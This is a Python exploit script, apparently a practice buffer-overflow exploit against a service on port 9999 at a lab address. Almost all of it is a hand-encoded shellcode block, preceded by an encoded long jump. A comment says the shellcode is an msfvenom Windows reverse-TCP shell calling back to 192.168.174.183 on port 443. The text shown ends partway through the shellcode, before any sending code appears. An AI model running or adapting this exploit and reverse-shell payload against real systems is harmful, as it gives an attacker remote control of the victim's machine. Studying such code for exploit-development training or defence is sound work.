#!/usr/bin/python 

import socket,sys

address = "192.168.174.132"
port = 9999

"""
long jump before sub-encoding:
JMP 00BCF250
"""
encoded_long_jmp = "\x54\x58\x66\x05\x78\x11\x50\x5C\x25\x01\x01\x01\x01\x25\x02\x02\x02\x02\x2D\x39\x57\x58\x58\x2D\x64\x32\x32\x32\x2D\x64\x32\x32\x32\x50\x25\x01\x01\x01\x01\x25\x02\x02\x02\x02\x2D\x09\x18\x03\x38\x2D\x09\x32\x05\x64\x2D\x05\x32\x05\x64\x50"

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.174.183 LPORT=443 -e x86/alpha_mixed -f python
#piped through silk
#len = 648 + 2171
shellcode = ""
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x32\x77\x63" ## add  eax, 0x63773211
shellcode += "\x05\x11\x32\x66\x63" ## add  eax, 0x63663211
shellcode += "\x05\x11\x22\x55\x42" ## add  eax, 0x42552211
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x12\x42\x37\x35" ## add  eax, 0x35374212
shellcode += "\x05\x22\x31\x36\x34" ## add  eax, 0x34363122
shellcode += "\x05\x12\x32\x35\x34" ## add  eax, 0x34353212
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x03\x66\x23" ## add  eax, 0x23660333
shellcode += "\x05\x42\x02\x55\x24" ## add  eax, 0x24550242
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x15\x41\x76\x61" ## add  eax, 0x61764115
shellcode += "\x05\x14\x41\x65\x51" ## add  eax, 0x51654114
shellcode += "\x05\x14\x31\x53\x61" ## add  eax, 0x61533114
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x73\x26\x03\x36" ## add  eax, 0x36032673
shellcode += "\x05\x62\x16\x03\x46" ## add  eax, 0x46031662
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x43\x66\x46\x77" ## add  eax, 0x77466643
shellcode += "\x05\x43\x56\x46\x66" ## add  eax, 0x66465643
shellcode += "\x05\x42\x34\x44\x55" ## add  eax, 0x55443442
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x51\x33\x34\x53" ## add  eax, 0x53343351
shellcode += "\x05\x51\x23\x34\x53" ## add  eax, 0x53342351
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x66\x71\x63" ## add  eax, 0x63716663
shellcode += "\x05\x63\x55\x61\x53" ## add  eax, 0x53615563
shellcode += "\x05\x42\x33\x51\x32" ## add  eax, 0x32513342
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x44\x16\x31\x77" ## add  eax, 0x77311644
shellcode += "\x05\x43\x26\x31\x66" ## add  eax, 0x66312643
shellcode += "\x05\x33\x14\x31\x55" ## add  eax, 0x55311433
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x77\x21\x34\x14" ## add  eax, 0x14342177
shellcode += "\x05\x66\x21\x34\x14" ## add  eax, 0x14342166
shellcode += "\x05\x55\x21\x33\x13" ## add  eax, 0x13332155
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x70\x27\x33\x23" ## add  eax, 0x23332770
shellcode += "\x05\x70\x27\x23\x23" ## add  eax, 0x23232770
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x43\x77\x63\x44" ## add  eax, 0x44637743
shellcode += "\x05\x43\x66\x63\x44" ## add  eax, 0x44636643
shellcode += "\x05\x33\x55\x42\x34" ## add  eax, 0x34425533
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x44\x66\x27" ## add  eax, 0x27664434
shellcode += "\x05\x34\x34\x55\x26" ## add  eax, 0x26553434
shellcode += "\x05\x33\x34\x44\x25" ## add  eax, 0x25443433
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x33\x32\x33" ## add  eax, 0x33323333
shellcode += "\x05\x23\x23\x21\x23" ## add  eax, 0x23212323
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x23\x33\x27" ## add  eax, 0x27332333
shellcode += "\x05\x23\x23\x23\x27" ## add  eax, 0x27232323
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x32\x30\x33\x33" ## add  eax, 0x33333032
shellcode += "\x05\x22\x20\x23\x23" ## add  eax, 0x23232022
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x63\x11\x33" ## add  eax, 0x33116311
shellcode += "\x05\x21\x53\x11\x22" ## add  eax, 0x22115321
shellcode += "\x05\x11\x43\x11\x22" ## add  eax, 0x22114311
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x46\x33\x23" ## add  eax, 0x23334611
shellcode += "\x05\x12\x46\x22\x12" ## add  eax, 0x12224612
shellcode += "\x05\x11\x34\x22\x22" ## add  eax, 0x22223411
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x23\x26\x11" ## add  eax, 0x11262333
shellcode += "\x05\x22\x12\x25\x12" ## add  eax, 0x12251222
shellcode += "\x05\x22\x22\x24\x11" ## add  eax, 0x11242222
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x76\x33\x64" ## add  eax, 0x64337662
shellcode += "\x05\x51\x66\x33\x53" ## add  eax, 0x53336651
shellcode += "\x05\x62\x54\x33\x43" ## add  eax, 0x43335462
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x35\x11\x35\x33" ## add  eax, 0x33351135
shellcode += "\x05\x35\x01\x24\x23" ## add  eax, 0x23240135
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x34\x21\x73" ## add  eax, 0x73213434
shellcode += "\x05\x33\x33\x22\x63" ## add  eax, 0x63223333
shellcode += "\x05\x23\x23\x21\x53" ## add  eax, 0x53212323
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x44\x62\x34" ## add  eax, 0x34624411
shellcode += "\x05\x11\x44\x52\x33" ## add  eax, 0x33524411
shellcode += "\x05\x11\x34\x62\x23" ## add  eax, 0x23623411
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x32\x37\x32" ## add  eax, 0x32373234
shellcode += "\x05\x34\x31\x36\x32" ## add  eax, 0x32363134
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x52\x33\x77\x63" ## add  eax, 0x63773352
shellcode += "\x05\x41\x33\x66\x63" ## add  eax, 0x63663341
shellcode += "\x05\x42\x23\x55\x42" ## add  eax, 0x42552342
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x66\x34\x71\x63" ## add  eax, 0x63713466
shellcode += "\x05\x55\x34\x61\x53" ## add  eax, 0x53613455
shellcode += "\x05\x64\x33\x51\x32" ## add  eax, 0x32513364
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x77\x36\x14\x43" ## add  eax, 0x43143677
shellcode += "\x05\x66\x25\x14\x33" ## add  eax, 0x33142566
shellcode += "\x05\x55\x26\x13\x32" ## add  eax, 0x32132655
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x43\x60\x32\x06" ## add  eax, 0x06326043
shellcode += "\x05\x42\x60\x42\x06" ## add  eax, 0x06426042
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x43\x31\x77\x63" ## add  eax, 0x63773143
shellcode += "\x05\x32\x32\x66\x63" ## add  eax, 0x63663232
shellcode += "\x05\x32\x31\x55\x42" ## add  eax, 0x42553132
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x34\x55\x53" ## add  eax, 0x53553433
shellcode += "\x05\x24\x34\x44\x52" ## add  eax, 0x52443424
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x35\x11\x33" ## add  eax, 0x33113563
shellcode += "\x05\x53\x34\x21\x33" ## add  eax, 0x33213453
shellcode += "\x05\x63\x34\x11\x23" ## add  eax, 0x23113463
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x11\x66\x44" ## add  eax, 0x44661111
shellcode += "\x05\x11\x12\x55\x44" ## add  eax, 0x44551211
shellcode += "\x05\x11\x11\x33\x34" ## add  eax, 0x34331111
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x57\x63\x34\x01" ## add  eax, 0x01346357
shellcode += "\x05\x57\x54\x34\x01" ## add  eax, 0x01345457
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x03\x34\x60\x54" ## add  eax, 0x54603403
shellcode += "\x05\x02\x34\x60\x54" ## add  eax, 0x54603402
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x77\x63\x44\x35" ## add  eax, 0x35446377
shellcode += "\x05\x66\x63\x43\x34" ## add  eax, 0x34436366
shellcode += "\x05\x55\x42\x43\x34" ## add  eax, 0x34434255
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x65\x17\x67\x61" ## add  eax, 0x61671765
shellcode += "\x05\x54\x16\x66\x51" ## add  eax, 0x51661654
shellcode += "\x05\x64\x15\x45\x61" ## add  eax, 0x61451564
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x30\x20\x30\x34" ## add  eax, 0x34302030
shellcode += "\x05\x20\x20\x20\x34" ## add  eax, 0x34202020
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x30\x30\x30\x20" ## add  eax, 0x20303030
shellcode += "\x05\x20\x20\x20\x20" ## add  eax, 0x20202020
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x77\x63\x31" ## add  eax, 0x31637711
shellcode += "\x05\x11\x66\x63\x31" ## add  eax, 0x31636611
shellcode += "\x05\x11\x55\x42\x21" ## add  eax, 0x21425511
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x15\x40\x36" ## add  eax, 0x36401534
shellcode += "\x05\x34\x14\x40\x35" ## add  eax, 0x35401434
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x15\x62\x32\x30" ## add  eax, 0x30326215
shellcode += "\x05\x14\x62\x22\x20" ## add  eax, 0x20226214
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x41\x11\x11\x11" ## add  eax, 0x11111141
shellcode += "\x05\x41\x12\x11\x11" ## add  eax, 0x11111241
shellcode += "\x05\x41\x11\x11\x11" ## add  eax, 0x11111141
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x14\x77\x63\x64" ## add  eax, 0x64637714
shellcode += "\x05\x13\x66\x63\x54" ## add  eax, 0x54636613
shellcode += "\x05\x13\x55\x42\x33" ## add  eax, 0x33425513
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x26\x33\x13" ## add  eax, 0x13332634
shellcode += "\x05\x34\x26\x44\x13" ## add  eax, 0x13442634
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x42\x22\x37\x33" ## add  eax, 0x33372242
shellcode += "\x05\x32\x21\x36\x32" ## add  eax, 0x32362132
shellcode += "\x05\x32\x22\x25\x22" ## add  eax, 0x22252232
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x11\x34\x44" ## add  eax, 0x44341111
shellcode += "\x05\x11\x11\x34\x33" ## add  eax, 0x33341111
shellcode += "\x05\x11\x11\x33\x33" ## add  eax, 0x33331111
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x37\x34\x22\x21" ## add  eax, 0x21223437
shellcode += "\x05\x26\x34\x11\x11" ## add  eax, 0x11113426
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x11\x76\x47" ## add  eax, 0x47761146
shellcode += "\x05\x45\x01\x75\x46" ## add  eax, 0x46750145
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x61\x37\x37\x35" ## add  eax, 0x35373761
shellcode += "\x05\x51\x36\x36\x34" ## add  eax, 0x34363651
shellcode += "\x05\x61\x25\x25\x24" ## add  eax, 0x24252561
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x35\x31\x77" ## add  eax, 0x77313534
shellcode += "\x05\x34\x34\x32\x66" ## add  eax, 0x66323434
shellcode += "\x05\x24\x24\x21\x55" ## add  eax, 0x55212424
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x12\x36\x36\x31" ## add  eax, 0x31363612
shellcode += "\x05\x12\x25\x25\x30" ## add  eax, 0x30252512
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x70\x45\x22\x12" ## add  eax, 0x12224570
shellcode += "\x05\x60\x44\x22\x12" ## add  eax, 0x12224460
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x13\x46\x11" ## add  eax, 0x11461346
shellcode += "\x05\x45\x12\x45\x12" ## add  eax, 0x12451245
shellcode += "\x05\x33\x12\x33\x11" ## add  eax, 0x11331233
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x16\x11\x62" ## add  eax, 0x62111634
shellcode += "\x05\x34\x25\x12\x62" ## add  eax, 0x62122534
shellcode += "\x05\x23\x14\x11\x42" ## add  eax, 0x42111423
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x06\x26\x46" ## add  eax, 0x46260646
shellcode += "\x05\x45\x06\x25\x45" ## add  eax, 0x45250645
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x23\x11\x62\x33" ## add  eax, 0x33621123
shellcode += "\x05\x12\x12\x62\x33" ## add  eax, 0x33621212
shellcode += "\x05\x22\x11\x42\x33" ## add  eax, 0x33421122
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x72\x34\x46\x34" ## add  eax, 0x34463472
shellcode += "\x05\x72\x24\x45\x24" ## add  eax, 0x24452472
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x26\x37\x12\x33" ## add  eax, 0x33123726
shellcode += "\x05\x15\x46\x12\x42" ## add  eax, 0x42124615
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x73\x12\x46\x74" ## add  eax, 0x74461273
shellcode += "\x05\x63\x12\x36\x64" ## add  eax, 0x64361263
shellcode += "\x05\x53\x12\x34\x53" ## add  eax, 0x53341253
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x24\x70\x33" ## add  eax, 0x33702463
shellcode += "\x05\x64\x14\x70\x42" ## add  eax, 0x42701464
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x61\x67\x16\x11" ## add  eax, 0x11166761
shellcode += "\x05\x52\x56\x16\x12" ## add  eax, 0x12165652
shellcode += "\x05\x41\x45\x14\x11" ## add  eax, 0x11144541
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x21\x77\x56" ## add  eax, 0x56772163
shellcode += "\x05\x63\x22\x66\x45" ## add  eax, 0x45662263
shellcode += "\x05\x43\x21\x55\x44" ## add  eax, 0x44552143
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x23\x46\x11" ## add  eax, 0x11462346
shellcode += "\x05\x45\x22\x45\x12" ## add  eax, 0x12452245
shellcode += "\x05\x33\x22\x33\x11" ## add  eax, 0x11332233
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x14\x72\x25\x25" ## add  eax, 0x25257214
shellcode += "\x05\x04\x71\x15\x24" ## add  eax, 0x24157104
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x62\x46\x34" ## add  eax, 0x34466211
shellcode += "\x05\x12\x62\x45\x24" ## add  eax, 0x24456212
shellcode += "\x05\x11\x42\x33\x24" ## add  eax, 0x24334211
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x46\x35\x10" ## add  eax, 0x10354631
shellcode += "\x05\x20\x45\x24\x10" ## add  eax, 0x10244520
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x34\x11\x61" ## add  eax, 0x61113462
shellcode += "\x05\x52\x24\x12\x62" ## add  eax, 0x62122452
shellcode += "\x05\x62\x23\x11\x41" ## add  eax, 0x41112362
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x36\x11\x44" ## add  eax, 0x44113646
shellcode += "\x05\x45\x25\x22\x34" ## add  eax, 0x34222545
shellcode += "\x05\x33\x24\x11\x33" ## add  eax, 0x33112433
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x46\x35\x26" ## add  eax, 0x26354611
